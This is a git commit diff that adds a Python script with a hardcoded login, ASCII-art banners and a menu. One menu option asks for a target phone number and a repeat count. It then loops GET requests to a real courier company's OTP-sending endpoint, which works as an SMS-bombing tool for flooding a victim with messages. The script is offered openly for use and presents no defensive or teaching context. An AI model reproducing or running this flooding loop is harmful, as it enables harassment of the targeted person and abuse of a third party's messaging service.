8ac27af7d571395711a179311c57f19e1382b1ae
MKmuslim-777 <158530621+MKmuslim-777@users.noreply.github.com>
2024-02-09 14:39:10 +0600

    Add files via upload

---
+++ manusystemAS.py
@@ -0,0 +1,126 @@
+import os,sys,requests
+
+def m():
+ print("""/033[1;32m
+ /$$      /$$ /$$      
+| $$$    /$$$| $$      
+| $$$$  /$$$$| $$   /$$
+| $$ $$/$$ $$| $$  /$$/
+| $$  $$$| $$| $$$$$$/ 
+| $$\  $ | $$| $$_  $$ 
+| $$ \/  | $$| $$ \  $$
+|__/     |__/|__/  \__/
+ """)
+ 
+ print( "\033[1;35m ===============::::::::::mk::::::::::===============")
+ 
+ print("""\033[1;35m 
+	   
+	CREATOR        : MUSLIM UDDIN KAISAN
+	FACEBOOK     : MUSLIM UDDIN MK
+        BUG FILTER    : AHESAN HOK  
+""")
+
+ print( "\033[1;35m ===============::::::::::mk::::::::::===============\n")
+
+ 
+def k():
+ print("""/033[1;32m
+ /$$      /$$  /$$$$$$  /$$   /$$  /$$$$$$ 
+| $$$    /$$$ /$$__  $$| $$  | $$ /$$__  $$
+| $$$$  /$$$$| $$  \ $$| $$  | $$| $$  \ $$
+| $$ $$/$$ $$| $$$$$$$$| $$$$$$$$| $$$$$$$$
+| $$  $$$| $$| $$__  $$| $$__  $$| $$__  $$
+| $$\  $ | $$| $$  | $$| $$  | $$| $$  | $$
+| $$ \/  | $$| $$  | $$| $$  | $$| $$  | $$
+|__/     |__/|__/  |__/|__/  |__/|__/  |__/
+ """)
+ 
+ print( "\033[1;35m ===============::::::::::mk::::::::::===============")
+ 
+ print("""\033[1;35m 
+	   
+	CREATOR        : MUSLIM UDDIN KAISAN
+	FACEBOOK     : MUSLIM UDDIN MK
+        BUG FILTER    : AHESAN HOK  
+""")
+
+ print( "\033[1;35m ===============::::::::::mk::::::::::===============\n")
+ 
+def op():
+ print("""/033[1;32m
+ /$$      /$$ /$$      
+| $$$    /$$$| $$      
+| $$$$  /$$$$| $$   /$$
+| $$ $$/$$ $$| $$  /$$/
+| $$  $$$| $$| $$$$$$/ 
+| $$\  $ | $$| $$_  $$ 
+| $$ \/  | $$| $$ \  $$
+|__/     |__/|__/  \__/                      
+ """)
+ print( "\033[1;35m ===============::::::::::mk::::::::::===============")
+ 
+ print("""\033[1;35m 
+	   
+	CREATOR        : MUSLIM UDDIN KAISAN
+	FACEBOOK     : MUSLIM UDDIN MK
+        BUG FILTER    : AHESAN HOK  
+""")
+
+ print( "\033[1;35m ===============::::::::::mk::::::::::===============\n")
+
+
+ 
+ number = str(input("Enter your target number:"))
+ url = "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=" + number
+ amount = int(input("Enter amount:"))
+
+ for i in range(amount):
+      requests.get(url)
+      print(str(i + 1) + ' Ahesan thanks bro')
+
+mkuser = 'muslimuddinmk'
+mahapass = 'maha'
+
+inputuser = input('    Enter correct user:  ')
+inputpass = input('    Enter correct pass:  ')
+if inputuser == mkuser and inputpass == mahapass:
+ print('/033[1;32m Thanks for your user & Password')
+else:
+ print('\033[1;31m wrong')
+ sys.exit()
+while True:
+ os.system('clear')
+ print("""/033[1;34m
+ 
+ /$$      /$$ /$$      
+| $$$    /$$$| $$      
+| $$$$  /$$$$| $$   /$$
+| $$ $$/$$ $$| $$  /$$/
+| $$  $$$| $$| $$$$$$/ 
+| $$\  $ | $$| $$_  $$ 
+| $$ \/  | $$| $$ \  $$
+|__/     |__/|__/  \__/                      
+ """)
+ print( "\033[1;35m ===============::::::::::mk::::::::::===============")
+ 
+ print("""\033[1;35m    
+	CREATOR        : MUSLIM UDDIN KAISAN
+	FACEBOOK     : MUSLIM UDDIN MK
+        BUG FILTER    : AHESAN HOK  
+""")
+ 
+ print("\033[1;31m    [>] select koro kun option e dukba:\n     _______________creator mk_______________\n\n    [1] Tools er personal logo\n    [2] vai ki cay\n    [3] Creator facebook\n")
+ 
+ print( "\033[1;34m ===============::::::::::mk::::::::::===============\n")
+ 
+ maha = int(input('\033[1;34m Enter any option: '))
+ if maha == 1:
+  m()
+  mk = input('\033[1,35m          press enter')
+ elif maha == 2:
+  k()
+  mk = input('\033[1,35m          press enter')
+ elif maha == 3:
+  op()
+  mk = input('\033[1,35m          press enter')
